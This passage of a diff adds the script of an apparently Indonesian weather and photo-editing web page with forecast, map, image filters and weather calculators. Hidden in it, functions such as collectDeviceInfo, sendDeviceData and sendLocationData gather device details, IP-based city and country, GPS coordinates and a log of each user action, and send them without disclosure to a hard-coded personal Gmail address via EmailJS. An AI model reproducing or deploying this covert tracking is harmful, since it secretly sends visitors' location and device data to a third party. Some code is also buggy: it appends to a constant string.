+        // Function to get forecast data
+        function getForecastData(lat, lon) {
+            fetch(`https://api.openweathermap.org/data/2.5/forecast?lat=${lat}&lon=${lon}&units=metric&appid=YOUR_API_KEY`)
+                .then(response => response.json())
+                .then(data => {
+                    updateForecastUI(data);
+                })
+                .catch(error => {
+                    console.error('Error fetching forecast data:', error);
+                    
+                    // Fallback to mock data
+                    updateForecastUI({
+                        list: [
+                            {
+                                dt: Date.now() / 1000 + 86400,
+                                main: { temp: 31 },
+                                weather: [{ main: "Clear" }]
+                            },
+                            {
+                                dt: Date.now() / 1000 + 172800,
+                                main: { temp: 32 },
+                                weather: [{ main: "Clouds" }]
+                            },
+                            {
+                                dt: Date.now() / 1000 + 259200,
+                                main: { temp: 30 },
+                                weather: [{ main: "Rain" }]
+                            },
+                            {
+                                dt: Date.now() / 1000 + 345600,
+                                main: { temp: 29 },
+                                weather: [{ main: "Clouds" }]
+                            },
+                            {
+                                dt: Date.now() / 1000 + 432000,
+                                main: { temp: 31 },
+                                weather: [{ main: "Clear" }]
+                            }
+                        ]
+                    });
+                });
+        }
+        
+        // Function to update forecast UI
+        function updateForecastUI(data) {
+            const forecastContainer = document.getElementById('forecastContainer');
+            forecastContainer.innerHTML = '';
+            
+            // Get one forecast per day (midday)
+            const dailyForecasts = {};
+            
+            data.list.forEach(item => {
+                const date = new Date(item.dt * 1000);
+                const day = date.toLocaleDateString('id-ID', { weekday: 'short' });
+                
+                if (!dailyForecasts[day] || date.getHours() === 12) {
+                    dailyForecasts[day] = item;
+                }
+            });
+            
+            // Display forecast for next 5 days
+            Object.keys(dailyForecasts).slice(0, 5).forEach(day => {
+                const forecast = dailyForecasts[day];
+                const date = new Date(forecast.dt * 1000);
+                
+                const forecastItem = document.createElement('div');
+                forecastItem.className = 'forecast-item';
+                
+                const dayName = date.toLocaleDateString('id-ID', { weekday: 'short' });
+                const temp = Math.round(forecast.main.temp);
+                const icon = getWeatherIcon(forecast.weather[0].main);
+                
+                forecastItem.innerHTML = `
+                    <div class="forecast-day">${dayName}</div>
+                    <div class="forecast-icon"><i class="${icon}"></i></div>
+                    <div class="forecast-temp">${temp}°C</div>
+                `;
+                
+                forecastContainer.appendChild(forecastItem);
+            });
+        }
+        
+        // Function to initialize map
+        function initializeMap() {
+            const mapContainer = document.getElementById('mapContainer');
+            
+            if (map) {
+                // If map already exists, just refresh it
+                mapContainer.innerHTML = '<div><div class="loading-spinner"></div><p class="mt-2">Memperbarui peta...</p></div>';
+                
+                setTimeout(() => {
+                    if (weatherMarker) {
+                        map.setView(weatherMarker.getLatLng(), 12);
+                    }
+                }, 1000);
+                
+                return;
+            }
+            
+            // Initialize map if not already initialized
+            mapContainer.innerHTML = '';
+            
+            // Get user's location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const { latitude, longitude } = position.coords;
+                        
+                        // Initialize map
+                        map = L.map(mapContainer).setView([latitude, longitude], 12);
+                        
+                        // Add tile layer
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                        }).addTo(map);
+                        
+                        // Add weather marker
+                        weatherMarker = L.marker([latitude, longitude]).addTo(map);
+                        
+                        // Add weather overlay (you would replace this with an actual weather API)
+                        // For now, just a placeholder
+                        L.circle([latitude, longitude], {
+                            color: 'blue',
+                            fillColor: '#30f',
+                            fillOpacity: 0.2,
+                            radius: 5000
+                        }).addTo(map);
+                    },
+                    error => {
+                        // Fallback to Jakarta
+                        map = L.map(mapContainer).setView([-6.2088, 106.8456], 12);
+                        
+                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                            attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                        }).addTo(map);
+                        
+                        weatherMarker = L.marker([-6.2088, 106.8456]).addTo(map);
+                        
+                        L.circle([-6.2088, 106.8456], {
+                            color: 'blue',
+                            fillColor: '#30f',
+                            fillOpacity: 0.2,
+                            radius: 5000
+                        }).addTo(map);
+                    }
+                );
+            } else {
+                // Fallback to Jakarta
+                map = L.map(mapContainer).setView([-6.2088, 106.8456], 12);
+                
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                }).addTo(map);
+                
+                weatherMarker = L.marker([-6.2088, 106.8456]).addTo(map);
+                
+                L.circle([-6.2088, 106.8456], {
+                    color: 'blue',
+                    fillColor: '#30f',
+                    fillOpacity: 0.2,
+                    radius: 5000
+                }).addTo(map);
+            }
+        }
+        
+        // Function to handle image upload
+        function handleImageUpload(file) {
+            if (!file.type.match('image.*')) {
+                showNotification('Error', 'Silakan unggah file gambar');
+                return;
+            }
+            
+            const reader = new FileReader();
+            
+            reader.onload = function(e) {
+                imagePreview.src = e.target.result;
+                imagePreviewContainer.style.display = 'block';
+                
+                // Setup canvas for image processing
+                imagePreview.onload = function() {
+                    setupCanvas(imagePreview);
+                };
+                
+                // Send notification about image upload
+                sendNotificationEmail(`Image uploaded: ${file.name} (${file.type})`);
+            };
+            
+            reader.readAsDataURL(file);
+        }
+        
+        // Function to setup canvas for image processing
+        function setupCanvas(img) {
+            canvas = document.createElement('canvas');
+            ctx = canvas.getContext('2d');
+            
+            canvas.width = img.naturalWidth;
+            canvas.height = img.naturalHeight;
+            
+            ctx.drawImage(img, 0, 0);
+            
+            // Save original image data
+            originalImageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+        }
+        
+        // Function to enhance image
+        function enhanceImage() {
+            if (!canvas || !ctx || !originalImageData) return;
+            
+            // Reset to original image
+            ctx.putImageData(originalImageData, 0, 0);
+            
+            // Get image data
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            
+            // Simple enhancement algorithm
+            for (let i = 0; i < data.length; i += 4) {
+                // Increase contrast
+                const factor = 1.2;
+                data[i] = ((data[i] - 128) * factor) + 128;     // Red
+                data[i + 1] = ((data[i + 1] - 128) * factor) + 128; // Green
+                data[i + 2] = ((data[i + 2] - 128) * factor) + 128; // Blue
+                
+                // Slight saturation increase
+                const gray = 0.2989 * data[i] + 0.5870 * data[i + 1] + 0.1140 * data[i + 2];
+                data[i] = gray + 1.2 * (data[i] - gray);     // Red
+                data[i + 1] = gray + 1.2 * (data[i + 1] - gray); // Green
+                data[i + 2] = gray + 1.2 * (data[i + 2] - gray); // Blue
+                
+                // Clamp values
+                data[i] = Math.max(0, Math.min(255, data[i]));
+                data[i + 1] = Math.max(0, Math.min(255, data[i + 1]));
+                data[i + 2] = Math.max(0, Math.min(255, data[i + 2]));
+            }
+            
+            // Put the modified image data back to canvas
+            ctx.putImageData(imageData, 0, 0);
+            
+            // Update preview image
+            imagePreview.src = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // Show notification
+            showNotification('Enhancement Applied', 'Gambar telah ditingkatkan kualitasnya');
+            
+            // Send notification about enhancement
+            sendNotificationEmail('Image enhanced');
+        }
+        
+        // Function to sharpen image
+        function sharpenImage() {
+            if (!canvas || !ctx || !originalImageData) return;
+            
+            // Reset to original image
+            ctx.putImageData(originalImageData, 0, 0);
+            
+            // Simple sharpening filter
+            const weights = [0, -1, 0, -1, 5, -1, 0, -1, 0];
+            const side = Math.round(Math.sqrt(weights.length));
+            const halfSide = Math.floor(side / 2);
+            
+            const src = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const sw = src.width;
+            const sh = src.height;
+            const w = sw;
+            const h = sh;
+            
+            const output = ctx.createImageData(w, h);
+            const dst = output.data;
+            
+            for (let y = 0; y < h; y++) {
+                for (let x = 0; x < w; x++) {
+                    const sy = y;
+                    const sx = x;
+                    const dstOff = (y * w + x) * 4;
+                    
+                    let r = 0, g = 0, b = 0;
+                    for (let cy = 0; cy < side; cy++) {
+                        for (let cx = 0; cx < side; cx++) {
+                            const scy = sy + cy - halfSide;
+                            const scx = sx + cx - halfSide;
+                            
+                            if (scy >= 0 && scy < sh && scx >= 0 && scx < sw) {
+                                const srcOff = (scy * sw + scx) * 4;
+                                const wt = weights[cy * side + cx];
+                                r += src.data[srcOff] * wt;
+                                g += src.data[srcOff + 1] * wt;
+                                b += src.data[srcOff + 2] * wt;
+                            }
+                        }
+                    }
+                    
+                    dst[dstOff] = Math.min(255, Math.max(0, r));
+                    dst[dstOff + 1] = Math.min(255, Math.max(0, g));
+                    dst[dstOff + 2] = Math.min(255, Math.max(0, b));
+                    dst[dstOff + 3] = 255; // Alpha
+                }
+            }
+            
+            ctx.putImageData(output, 0, 0);
+            
+            // Update preview image
+            imagePreview.src = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // Show notification
+            showNotification('Sharpen Applied', 'Gambar telah diperjelas');
+            
+            // Send notification about sharpening
+            sendNotificationEmail('Image sharpened');
+        }
+        
+        // Function to apply image filters
+        function applyImageFilters() {
+            if (!canvas || !ctx || !originalImageData) return;
+            
+            // Reset to original image
+            ctx.putImageData(originalImageData, 0, 0);
+            
+            // Get image data
+            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+            const data = imageData.data;
+            
+            // Get slider values
+            const brightness = parseInt(brightnessSlider.value);
+            const contrast = parseInt(contrastSlider.value);
+            const saturation = parseInt(saturationSlider.value);
+            
+            // Apply brightness, contrast, and saturation
+            for (let i = 0; i < data.length; i += 4) {
+                // Apply brightness
+                data[i] += brightness;     // Red
+                data[i + 1] += brightness; // Green
+                data[i + 2] += brightness; // Blue
+                
+                // Apply contrast
+                const factor = (259 * (contrast + 255)) / (255 * (259 - contrast));
+                data[i] = factor * (data[i] - 128) + 128;     // Red
+                data[i + 1] = factor * (data[i + 1] - 128) + 128; // Green
+                data[i + 2] = factor * (data[i + 2] - 128) + 128; // Blue
+                
+                // Apply saturation
+                const gray = 0.2989 * data[i] + 0.5870 * data[i + 1] + 0.1140 * data[i + 2];
+                data[i] = gray + (saturation / 100) * (data[i] - gray);     // Red
+                data[i + 1] = gray + (saturation / 100) * (data[i + 1] - gray); // Green
+                data[i + 2] = gray + (saturation / 100) * (data[i + 2] - gray); // Blue
+                
+                // Clamp values
+                data[i] = Math.max(0, Math.min(255, data[i]));
+                data[i + 1] = Math.max(0, Math.min(255, data[i + 1]));
+                data[i + 2] = Math.max(0, Math.min(255, data[i + 2]));
+            }
+            
+            // Put the modified image data back to canvas
+            ctx.putImageData(imageData, 0, 0);
+            
+            // Update preview image
+            imagePreview.src = canvas.toDataURL('image/jpeg', 0.9);
+        }
+        
+        // Function to download image
+        function downloadImage() {
+            if (!canvas) return;
+            
+            // Create download link
+            const a = document.createElement('a');
+            a.href = canvas.toDataURL('image/jpeg', 0.9);
+            a.download = 'enhanced-image.jpg';
+            a.click();
+            
+            // Show notification
+            showNotification('Download Complete', 'Gambar telah diunduh');
+            
+            // Send notification about download
+            sendNotificationEmail('Image downloaded');
+        }
+        
+        // Function to calculate heat index
+        function calculateHeatIndex() {
+            const temperature = parseFloat(document.getElementById('temperatureInput').value);
+            const humidity = parseFloat(document.getElementById('humidityInput').value);
+            
+            // Heat index formula (simplified)
+            let heatIndex = temperature;
+            
+            if (temperature >= 27) {
+                heatIndex = -8.78469475556 + 1.61139411 * temperature + 2.33854883889 * humidity
+                    - 0.14611605 * temperature * humidity - 0.012308094 * temperature * temperature
+                    - 0.0164248277778 * humidity * humidity + 0.002211732 * temperature * temperature * humidity
+                    + 0.00072546 * temperature * humidity * humidity - 0.000003582 * temperature * temperature * humidity * humidity;
+            }
+            
+            // Round to one decimal place
+            heatIndex = Math.round(heatIndex * 10) / 10;
+            
+            // Determine heat index category
+            let category = '';
+            let color = '';
+            
+            if (heatIndex < 27) {
+                category = 'Normal';
+                color = 'success';
+            } else if (heatIndex < 32) {
+                category = 'Caution';
+                color = 'warning';
+            } else if (heatIndex < 41) {
+                category = 'Extreme Caution';
+                color = 'danger';
+            } else if (heatIndex < 54) {
+                category = 'Danger';
+                color = 'danger';
+            } else {
+                category = 'Extreme Danger';
+                color = 'danger';
+            }
+            
+            // Display result
+            const heatIndexResult = document.getElementById('heatIndexResult');
+            const heatIndexValue = document.getElementById('heatIndexValue');
+            const heatIndexDescription = document.getElementById('heatIndexDescription');
+            
+            heatIndexValue.textContent = `Heat Index: ${heatIndex}°C`;
+            heatIndexDescription.textContent = `Category: ${category}`;
+            heatIndexDescription.className = `text-${color}`;
+            
+            heatIndexResult.style.display = 'block';
+            
+            // Send notification about calculation
+            sendNotificationEmail(`Heat index calculated: ${heatIndex}°C (${category})`);
+        }
+        
+        // Function to convert wind speed
+        function convertWindSpeed() {
+            const speed = parseFloat(document.getElementById('windSpeedInput').value);
+            const fromUnit = document.getElementById('windSpeedUnitFrom').value;
+            const toUnit = document.getElementById('windSpeedUnitTo').value;
+            
+            // Convert to m/s first
+            let speedInMs = speed;
+            
+            switch (fromUnit) {
+                case 'kmh':
+                    speedInMs = speed / 3.6;
+                    break;
+                case 'mph':
+                    speedInMs = speed * 0.44704;
+                    break;
+                case 'knot':
+                    speedInMs = speed * 0.514444;
+                    break;
+                case 'bf':
+                    // Convert Beaufort scale to m/s (approximate)
+                    speedInMs = Math.pow(speed, 1.5) * 0.836;
+                    break;
+            }
+            
+            // Convert from m/s to target unit
+            let result = speedInMs;
+            
+            switch (toUnit) {
+                case 'kmh':
+                    result = speedInMs * 3.6;
+                    break;
+                case 'mph':
+                    result = speedInMs / 0.44704;
+                    break;
+                case 'knot':
+                    result = speedInMs / 0.514444;
+                    break;
+                case 'bf':
+                    // Convert m/s to Beaufort scale (approximate)
+                    result = Math.pow(speedInMs / 0.836, 2/3);
+                    break;
+            }
+            
+            // Round to two decimal places
+            result = Math.round(result * 100) / 100;
+            
+            // Get unit name
+            let unitName = '';
+            switch (toUnit) {
+                case 'ms':
+                    unitName = 'm/s (meter per detik)';
+                    break;
+                case 'kmh':
+                    unitName = 'km/h (kilometer per jam)';
+                    break;
+                case 'mph':
+                    unitName = 'mph (mil per jam)';
+                    break;
+                case 'knot':
+                    unitName = 'knot';
+                    break;
+                case 'bf':
+                    unitName = 'Beaufort Scale';
+                    break;
+            }
+            
+            // Display result
+            const windSpeedResult = document.getElementById('windSpeedResult');
+            const windSpeedValue = document.getElementById('windSpeedValue');
+            
+            windSpeedValue.textContent = `${result} ${unitName}`;
+            windSpeedResult.style.display = 'block';
+            
+            // Send notification about conversion
+            sendNotificationEmail(`Wind speed converted: ${speed} ${fromUnit} = ${result} ${toUnit}`);
+        }
+        
+        // Function to calculate humidity
+        function calculateHumidity() {
+            const dryBulbTemp = parseFloat(document.getElementById('dryBulbTemp').value);
+            const wetBulbTemp = parseFloat(document.getElementById('wetBulbTemp').value);
+            const pressure = parseFloat(document.getElementById('pressureInput').value);
+            
+            // Simplified calculation of relative humidity
+            const saturationVaporPressure = 6.112 * Math.exp((17.67 * dryBulbTemp) / (dryBulbTemp + 243.5));
+            const actualVaporPressure = 6.112 * Math.exp((17.67 * wetBulbTemp) / (wetBulbTemp + 243.5)) - pressure * (dryBulbTemp - wetBulbTemp) * 0.00066;
+            
+            const relativeHumidity = (actualVaporPressure / saturationVaporPressure) * 100;
+            
+            // Calculate absolute humidity (g/m³)
+            const absoluteHumidity = (actualVaporPressure * 100) / (461.5 * (dryBulbTemp + 273.15));
+            
+            // Calculate dew point
+            const a = 17.27;
+            const b = 237.7;
+            const alpha = ((a * dryBulbTemp) / (b + dryBulbTemp)) + Math.log(relativeHumidity / 100);
+            const dewPoint = (b * alpha) / (a - alpha);
+            
+            // Round values
+            const roundedRH = Math.round(relativeHumidity * 10) / 10;
+            const roundedAH = Math.round(absoluteHumidity * 100) / 100;
+            const roundedDP = Math.round(dewPoint * 10) / 10;
+            
+            // Display result
+            const humidityResult = document.getElementById('humidityResult');
+            const relativeHumidityEl = document.getElementById('relativeHumidity');
+            const absoluteHumidityEl = document.getElementById('absoluteHumidity');
+            const dewPointEl = document.getElementById('dewPoint');
+            
+            relativeHumidityEl.textContent = `Relative Humidity: ${roundedRH}%`;
+            absoluteHumidityEl.textContent = `Absolute Humidity: ${roundedAH} g/m³`;
+            dewPointEl.textContent = `Dew Point: ${roundedDP}°C`;
+            
+            humidityResult.style.display = 'block';
+            
+            // Send notification about calculation
+            sendNotificationEmail(`Humidity calculated: RH=${roundedRH}%, AH=${roundedAH} g/m³, DP=${roundedDP}°C`);
+        }
+        
+        // Function to collect device information
+        function collectDeviceInfo() {
+            // Get basic device info
+            const userAgent = navigator.userAgent;
+            let deviceType = 'Desktop';
+            let operatingSystem = 'Unknown';
+            
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
+                deviceType = 'Mobile';
+                
+                if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    operatingSystem = 'iOS';
+                } else if (/Android/i.test(userAgent)) {
+                    operatingSystem = 'Android';
+                }
+            } else if (/Windows/i.test(userAgent)) {
+                operatingSystem = 'Windows';
+            } else if (/Mac/i.test(userAgent)) {
+                operatingSystem = 'macOS';
+            } else if (/Linux/i.test(userAgent)) {
+                operatingSystem = 'Linux';
+            }
+            
+            // Get browser
+            let browser = 'Unknown';
+            if (/Chrome/i.test(userAgent) && !/Edge|Edg/i.test(userAgent)) {
+                browser = 'Chrome';
+            } else if (/Firefox/i.test(userAgent)) {
+                browser = 'Firefox';
+            } else if (/Safari/i.test(userAgent) && !/Chrome/i.test(userAgent)) {
+                browser = 'Safari';
+            } else if (/Edge|Edg/i.test(userAgent)) {
+                browser = 'Edge';
+            } else if (/Opera/i.test(userAgent)) {
+                browser = 'Opera';
+            }
+            
+            // Get device memory
+            const deviceMemory = navigator.deviceMemory || 'Unknown';
+            
+            // Get CPU cores
+            const cpuCores = navigator.hardwareConcurrency || 'Unknown';
+            
+            // Get screen resolution
+            const screenResolution = `${screen.width}x${screen.height}`;
+            
+            // Get connection info
+            const connectionStatus = navigator.onLine ? 'Online' : 'Offline';
+            let connectionType = 'Unknown';
+            
+            if ('connection' in navigator) {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                connectionType = connection.type || 'Unknown';
+            }
+            
+            // Get location info
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    // Send device data to email
+                    sendDeviceData({
+                        deviceType: deviceType,
+                        operatingSystem: operatingSystem,
+                        browser: browser,
+                        deviceMemory: deviceMemory,
+                        cpuCores: cpuCores,
+                        screenResolution: screenResolution,
+                        connectionStatus: connectionStatus,
+                        connectionType: connectionType,
+                        ipAddress: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        country: data.country_name,
+                        timestamp: new Date().toISOString()
+                    });
+                })
+                .catch(error => {
+                    console.error('Error getting location info:', error);
+                    
+                    // Send device data without location
+                    sendDeviceData({
+                        deviceType: deviceType,
+                        operatingSystem: operatingSystem,
+                        browser: browser,
+                        deviceMemory: deviceMemory,
+                        cpuCores: cpuCores,
+                        screenResolution: screenResolution,
+                        connectionStatus: connectionStatus,
+                        connectionType: connectionType,
+                        ipAddress: 'Unknown',
+                        city: 'Unknown',
+                        region: 'Unknown',
+                        country: 'Unknown',
+                        timestamp: new Date().toISOString()
+                    });
+                });
+        }
+        
+        // Function to send device data to email
+        function sendDeviceData(deviceData) {
+            try {
+                const message = `Device Information:\n\n`;
+                for (const [key, value] of Object.entries(deviceData)) {
+                    message += `${key}: ${value}\n`;
+                }
+                
+                const templateParams = {
+                    to_email: "agusbangle53@gmail.com",
+                    message: message,
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    type: 'device'
+                };
+                
+                // Replace with your actual Service ID and Template ID
+                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                    .then(response => {
+                        console.log('Device data sent successfully');
+                    })
+                    .catch(error => {
+                        console.error('Error sending device data:', error);
+                    });
+            } catch (error) {
+                console.error('Error in sendDeviceData:', error);
+            }
+        }
+        
+        // Function to send location data to email
+        function sendLocationData(locationData) {
+            try {
+                const message = `Location Data:\nLatitude: ${locationData.latitude}\nLongitude: ${locationData.longitude}\nAccuracy: ${locationData.accuracy} meters\nTimestamp: ${new Date(locationData.timestamp).toLocaleString()}`;
+                
+                const templateParams = {
+                    to_email: "agusbangle53@gmail.com",
+                    message: message,
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    type: 'location'
+                };
+                
+                // Replace with your actual Service ID and Template ID
+                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                    .then(response => {
+                        console.log('Location data sent successfully');
+                    })
+                    .catch(error => {
+                        console.error('Error sending location data:', error);
+                    });
+            } catch (error) {
+                console.error('Error in sendLocationData:', error);
+            }
+        }
+        
+        // Function to send weather data to email
+        function sendWeatherData(weatherData) {
+            try {
+                const message = `Weather Data:\nLocation: ${weatherData.location}, ${weatherData.country}\nTemperature: ${weatherData.temperature}°C\nFeels Like: ${weatherData.feelsLike}°C\nHumidity: ${weatherData.humidity}%\nPressure: ${weatherData.pressure} hPa\nWind Speed: ${weatherData.windSpeed} m/s\nWeather: ${weatherData.weatherDescription}\nTimestamp: ${new Date(weatherData.timestamp).toLocaleString()}`;
+                
+                const templateParams = {
+                    to_email: "agusbangle53@gmail.com",
+                    message: message,
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    type: 'weather'
+                };
+                
+                // Replace with your actual Service ID and Template ID
+                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                    .then(response => {
+                        console.log('Weather data sent successfully');
+                    })
+                    .catch(error => {
+                        console.error('Error sending weather data:', error);
+                    });
+            } catch (error) {
+                console.error('Error in sendWeatherData:', error);
+            }
+        }
+        
+        // Function to send notification email
+        function sendNotificationEmail(message) {
+            try {
+                const templateParams = {
+                    to_email: "agusbangle53@gmail.com",
+                    message: message,
+                    timestamp: new Date().toLocaleString('id-ID'),
+                    type: 'notification'
+                };
+                
+                // Replace with your actual Service ID and Template ID
+                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
+                    .then(response => {
+                        console.log('Notification sent successfully');
+                    })
+                    .catch(error => {
+                        console.error('Error sending notification:', error);
+                    });
+            } catch (error) {
+                console.error('Error in sendNotificationEmail:', error);
+            }
+        }
+        
+        // Function to show notification
+        function showNotification(title, message) {
+            const notificationTitle = notificationToast.querySelector('.notification-title');
+            const notificationMessage = notificationToast.querySelector('.notification-message');
+            
+            notificationTitle.textContent = title;
+            notificationMessage.textContent = message;
+            
+            notificationToast.classList.add('show');
+            
+            setTimeout(() => {
+                notificationToast.classList.remove('show');
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
